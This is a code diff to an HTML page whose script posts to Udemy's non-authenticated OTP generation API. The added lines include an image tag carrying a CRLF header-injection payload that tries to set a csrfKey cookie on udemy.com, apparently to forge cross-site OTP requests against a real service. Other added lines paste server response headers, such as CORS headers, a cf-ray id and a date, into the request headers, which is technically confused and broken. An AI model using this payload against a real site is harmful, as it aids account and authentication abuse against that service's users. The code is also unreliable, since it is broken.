@@ -25,7 +25,9 @@
         <img src="https://s.udemycdn.com/partner-logos/v4/netapp-light.svg" alt="NetApp" height="44" width="115" loading="lazy">
         <img src="https://s.udemycdn.com/partner-logos/v4/eventbrite-light.svg" alt="Eventbrite" height="44" width="115" loading="lazy">
     </div>
+    <img src="https://www.udemy.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.cookie">
     <script>
+        
         async function getData() {
               const url = "https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/";
               try {
@@ -37,7 +39,17 @@
                     "Content-Type": "application/json",
                     "Accept": "application/json",
                     // adicione aqui qualquer header custom que o servidor espere, ex:
-                    // "X-CSRF-Token": "valor", 
+                    'Access-Control-Allow-Credentials': 'true',
+                      'access-control-allow-origin':'https://www.udemy.com',
+'allow':'POST, OPTIONS',
+'cache-control': 'max-age=0, max-stale=0, must-revalidate, no-cache, no-store, post-check=0, pre-check=0, private',
+'cf-cache-status':'DYNAMIC',
+'cf-ray':'98cc60d99ffea182-GRU',
+'content-encoding':'br',
+'content-type':'application/json',
+'date':'Sat, 11 Oct 2025 06:42:35 GMT',
+
+
                     "X-Requested-With": "XMLHttpRequest"
                   },
                   body: JSON.stringify({
